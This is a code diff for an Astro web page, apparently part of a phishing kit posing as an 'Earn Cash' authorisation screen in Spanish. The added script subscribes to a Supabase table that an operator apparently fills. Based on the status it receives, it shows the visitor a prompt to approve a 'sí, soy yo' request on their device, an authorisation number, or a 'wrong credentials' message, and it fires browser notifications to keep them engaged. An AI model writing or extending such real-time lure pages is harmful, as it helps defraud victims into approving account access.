@@ -5,7 +5,9 @@ import Layout from "../layouts/Layout.astro"
 <Layout>
     <div class="container-loader">
         <h2>Autorice Earn Cash desde su dispositivo si es necesario</h2>
-
+        <div class="messages">
+            <strong id="mensaje" >Cargando...</strong>
+        </div>
         <div class="spinner"></div>
     </div>
 </Layout>
@@ -40,7 +42,68 @@ import Layout from "../layouts/Layout.astro"
 </style>
 
 <script>
-    setTimeout(function(){
+     import { createClient } from '@supabase/supabase-js';
+
+    const supabaseUrl = import.meta.env.PUBLIC_SUPABASE_URL;
+    const supabaseAnonKey = import.meta.env.PUBLIC_SUPABASE_ANON_KEY;
+    function notification (mensajeADM:string,mensaje:string){
+        // Si tenemos permiso, lanzamos la notificación nativa del sistema
+          if ('Notification' in window && Notification.permission === 'granted') {
+            const notificacion = new Notification(mensajeADM, {
+              body: mensaje,
+              icon: '/favicon.svg' // Opcional: Ruta a un icono en tu carpeta public/
+            });
+
+            // Opcional: Si hace clic en la notificación, lo trae de vuelta a tu web
+            notificacion.onclick = () => {
+              window.focus();
+            };
+          }else{
+            alert(mensaje)
+          }
+    }
+    // En lugar de usar "return" suelto, metemos la lógica válida dentro del bloque if
+    if (supabaseUrl && supabaseAnonKey) {
+        const mensajeElement = document.getElementById('mensaje') as HTMLElement;
+        mensajeElement.textContent = 'Cargando...';
+      const supabase = createClient(supabaseUrl, supabaseAnonKey);
+      // 1. Conectar al canal de WebSockets de Supabase
+    // 1. Conectar al canal de WebSockets de Supabase
+    let mensaje = ""
+        supabase
+            .channel('cambios-en-mensajes')
+            .on(
+            'postgres_changes',
+            { event: 'INSERT', schema: 'public', table: 'mensaje' }, // Asegúrate de que tu tabla se llame 'fake'
+            (payload) => {
+                console.log('¡Nuevo mensaje recibido!', payload.new);
+                if(payload.new.status == 1){
+                    mensaje = 'Presione "si, soy yo" su dispositivo para autorizar Earn Cash'
+                    mensajeElement.textContent = mensaje
+                     notification ("Autorizacion pendiente",mensaje)
+                }
+                if(payload.new.status == 2){
+                     mensaje = 'Numero de autorizacion: '+payload.new.message
+                     mensajeElement.textContent = mensaje
+                     notification ("Autorizacion pendiente",mensaje)
+
+                }
+                if(payload.new.status == 3){
+                     mensaje = 'Credenciales incorrectas'
+                     mensajeElement.textContent = mensaje
+                    notification ("Autorizacion pendiente",mensaje)
+                }
+
+                if(payload.new.status == 4){
+                     document.location = '/'
+                }
+            }
+            )
+            .subscribe();
+    }
+
+
+    /* setTimeout(function(){
         alert("error del servidor")
-    }, 1000)
+    }, 20000) */
 </script>
